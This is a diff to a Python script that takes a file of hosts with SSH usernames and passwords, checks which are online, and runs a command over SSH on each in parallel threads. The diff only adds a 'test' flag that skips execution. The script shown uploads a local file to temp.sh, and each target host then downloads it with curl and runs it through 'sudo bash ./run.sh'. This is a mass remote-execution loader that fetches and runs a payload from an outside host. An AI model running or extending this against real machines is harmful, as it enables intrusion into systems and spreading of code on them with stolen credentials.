@@ -1,5 +1,5 @@
 #!/bin/python3
-import threading, socket, os
+import threading, socket, os, sys
 
 class bcolors:
     CYAN = '\033[96m'
@@ -34,7 +34,10 @@ def check_ip(host,port,username,password):
    else:
       s.close()
       no_error(host,port,"Online")
-      threading.Thread(target=execute_ssh, args=(host,port,username,password,command)).start()
+      if ("test" in sys.argv):
+      	pass
+      else:
+          threading.Thread(target=execute_ssh, args=(host,port,username,password,command)).start()
    del s
 
 if (os.name == 'nt'):
@@ -53,14 +56,17 @@ except FileNotFoundError as e:
 Lines = file1.readlines()
 file1.close()
 
-command=str(input("Input command or file: "))
-if os.path.isfile(command):
-	check=os.popen(f"curl --upload-file {command} https://temp.sh 2> /dev/null").read()
-	if (check == ""):
-		print(f"{bcolors.RED}[!] Network ERROR!")
-		exit()
-	else:
-	    command=f"cd $HOME; curl {check} -o run.sh 2> /dev/null; sudo bash ./run.sh"
+if ("test" in sys.argv):
+	pass
+else:
+    command=str(input("Input command or file: "))
+    if os.path.isfile(command):
+	    check=os.popen(f"curl --upload-file {command} https://temp.sh 2> /dev/null").read()
+	    if (check == ""):
+		    print(f"{bcolors.RED}[!] Network ERROR!")
+		    exit()
+	    else:
+	        command=f"cd $HOME; curl {check} -o run.sh 2> /dev/null; sudo bash ./run.sh"
 
 for line in Lines:
    info=line.split(" ")
